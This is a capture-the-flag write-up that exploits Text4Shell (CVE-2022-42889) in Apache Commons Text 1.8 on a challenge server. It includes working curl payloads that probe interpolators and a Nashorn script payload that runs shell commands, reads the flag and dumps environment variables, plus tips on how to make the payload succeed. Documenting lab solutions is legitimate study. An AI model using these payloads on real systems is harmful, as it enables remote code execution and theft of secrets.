# Fan Signal Lab — 350 pts (CVE)

**Target:** `http://54.72.82.22:8220`
**Flag:** `safctf{e5ca75a4e6e0507f9dd29be81997b9b6}`

## Flavor text → vulnerability

| Clue | Meaning |
|---|---|
| "You can **Text** Me But, Can You **Speak My Language**?" | **Text4Shell** — the `${script:...}` interpolator runs code in a *scripting language* |
| "an old incident note names a **neighboring version**" | Advisory names **1.10.0** as the fix |
| "verify which build is actually **running**" | Fingerprint the actual Commons Text version |
| "the smallest **note** sets the mood" | Smallest unit of text — a single interpolated `${...}` token |

**CVE-2022-42889 (Text4Shell)** — Apache Commons Text `StringSubstitutor` 1.5–1.9
ships `script`, `dns` and `url` interpolators **enabled by default**, allowing
arbitrary code execution from any user-controlled string passed through it.

Running build: **commons-text 1.8** → vulnerable.

## Reconnaissance

`/` serves the page as `text/plain;charset=UTF-8` (not `text/html`) — deliberately
killing browser-side XSS and pointing at a server-side flaw. No `Server:` header.

```
GET /home?message=hello        ->  Text Received: hello
GET /home?message=             ->  Text Received: ?message=You can Text Me But, Can You Speak My Language?
POST /home                     ->  405 Method Not Allowed
OPTIONS /home                  ->  Allow: GET,HEAD,OPTIONS
/actuator/*                    ->  404
/error                         ->  Spring Boot error JSON (status 999)
```

The empty-message response leaks the actual hint string. Note that `${7*7}`
reflects **literally** — `StringSubstitutor` does not do arithmetic, it only
resolves `${prefix:value}` *lookups*. That is the discriminator between a
real Text4Shell sink and a plain echo.

## Confirming the sink

```bash
U=http://54.72.82.22:8220/home
curl -g -s -G --data-urlencode 'message=${script:javascript:7*7}'   "$U"   # -> 49
curl -g -s -G --data-urlencode 'message=${script:js:1+1}'           "$U"   # -> 2
curl -g -s -G --data-urlencode 'message=${sys:java.version}'        "$U"   # -> 1.8.0_504
curl -g -s -G --data-urlencode 'message=${sys:os.name}'             "$U"   # -> Linux
curl -g -s -G --data-urlencode 'message=${env:PATH}'                "$U"   # -> /opt/java/openjdk/bin:...
curl -g -s -G --data-urlencode 'message=${dns:localhost}'           "$U"   # -> 127.0.0.1
curl -g -s -G --data-urlencode 'message=${base64Encoder:hello}'     "$U"   # -> aGVsbG8=
curl -g -s -G --data-urlencode 'message=${url:http://127.0.0.1:8220/}' "$U" # literal -> url not enabled
```

`script` and `dns` resolving while `url` does not is consistent with the
pre-1.10.0 default interpolator set.

Java 8 ⇒ **Nashorn is bundled** ⇒ `${script:javascript:...}` yields RCE.

## Exploitation

`curl` must be run with `-g`, otherwise `{}` in the payload is expanded by
curl's URL globbing and never reaches the server.

Java 8 is a JRE-only image (no `jar`/`javac`), so results are read back with
Nashorn itself.

### 1. Command execution

```bash
P='${script:javascript:new java.util.Scanner(java.lang.Runtime.getRuntime().exec(["/bin/sh","-c","id; hostname"]).getInputStream()).useDelimiter("\\A").next()}'
curl -g -s -G --data-urlencode "message=$P" http://54.72.82.22:8220/home
# Text Received: uid=999(appuser) gid=999(appgroup) groups=999(appgroup)
#                d39d31e8c6f8
```

### 2. Read the flag

```bash
P='${script:javascript:new java.util.Scanner(java.lang.Runtime.getRuntime().exec(["/bin/sh","-c","cat /app/flag; env"]).getInputStream()).useDelimiter("\\A").next()}'
curl -g -s -G --data-urlencode "message=$P" http://54.72.82.22:8220/home
```

```
/app/flag  -> safctf{e5ca75a4e6e0507f9dd29be81997b9b6}
FLAG=safctf{e5ca75a4e6e0507f9dd29be81997b9b6}
```

### 3. Identify the running build

```bash
P='${script:javascript:java.util.Collections.list(new java.util.jar.JarFile("/app/app.jar").entries()).toString()}'
curl -g -s -G --data-urlencode "message=$P" http://54.72.82.22:8220/home | grep -oE 'commons-text-[0-9.]+'
```

```
commons-text-1.8      <- vulnerable
spring-boot-2.1.1.RELEASE
```

## Gotchas

* **`StringSubstitutor` stops the variable at the first `}`.** Any payload
  containing `{` or `}` (loops, `if`, function bodies) breaks interpolation and
  comes back as a literal. Keep the injected script a **brace-free single
  expression** — e.g. `Collections.list(enumeration).toString()` instead of a
  `while` loop.
* Use `curl -g` so `{}` is not swallowed by URL globbing.
* A lookup that throws is swallowed by Commons Text and the `${...}` is echoed
  back unchanged — a literal echo means the *script* failed, not that the sink
  is absent.
